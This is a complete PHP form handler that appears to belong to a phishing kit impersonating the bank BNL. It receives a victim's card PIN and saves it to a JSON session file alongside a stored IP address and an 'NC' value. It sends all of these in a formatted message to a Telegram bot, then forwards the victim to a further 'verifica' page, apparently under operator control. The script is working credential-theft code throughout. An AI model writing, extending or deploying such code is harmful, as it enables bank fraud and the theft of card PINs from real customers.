<?php
require_once __DIR__ . '/telegram_config.php';

$id  = $_POST['id'] ?? '';
$pin = trim($_POST['pin_carta'] ?? '');

if (!$id || $pin === '') {
    header('Location: index.html');
    exit;
}

$df   = __DIR__ . '/data.json';
$data = file_exists($df) ? json_decode(file_get_contents($df), true) : ['sessions' => []];

if (!isset($data['sessions'][$id])) {
    header('Location: index.html');
    exit;
}

// Salva PIN e RESETTA tutto
$data['sessions'][$id]['pin_carta']      = $pin;
$data['sessions'][$id]['status']         = 'waiting';
$data['sessions'][$id]['next_page']      = '';
$data['sessions'][$id]['force_redirect'] = 0;
$data['sessions'][$id]['updated_at']     = date('Y-m-d H:i:s');
file_put_contents($df, json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE), LOCK_EX);

// Telegram
$nc  = $data['sessions'][$id]['nc'];
$ip  = $data['sessions'][$id]['ip'];
$msg = "<b>BNL PIN CARTA</b>\n"
     . "ID: <code>{$id}</code>\n"
     . "IP: {$ip}\n"
     . "NC: <code>{$nc}</code>\n"
     . "PIN Carta: <code>{$pin}</code>";
tg_send($msg);

header("Location: verifica.php?id=" . urlencode($id));
exit;